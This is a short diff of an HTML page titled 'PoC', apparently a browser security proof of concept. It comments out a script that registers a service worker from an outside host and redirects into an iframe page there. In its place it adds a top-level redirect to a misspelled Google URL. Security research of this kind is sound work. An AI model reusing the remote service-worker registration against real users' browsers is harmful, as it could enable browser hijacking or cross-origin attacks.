@@ -5,16 +5,17 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1">
 		<title>PoC</title>
 		<script>
-			if ("serviceWorker" in navigator) {
-				addEventListener("load", async () => {
-					const registration = await navigator.serviceWorker.register("https://cr.kungfoo.net/yao/downloads/sw.js");
-					if (registration.installing) {
-						location.reload();
-					} else {
-						location = "https://cr.kungfoo.net/yao/downloads/iframe.html";
-					}
-				});
-			}
+			top.location.href = "htttps://www.google.com";
+// 			if ("serviceWorker" in navigator) {
+// 				addEventListener("load", async () => {
+// 					const registration = await navigator.serviceWorker.register("https://cr.kungfoo.net/yao/downloads/sw.js");
+// 					if (registration.installing) {
+// 						location.reload();
+// 					} else {
+// 						location = "https://cr.kungfoo.net/yao/downloads/iframe.html";
+// 					}
+// 				});
+// 			}
 		</script>
 	</head>
 	<body>
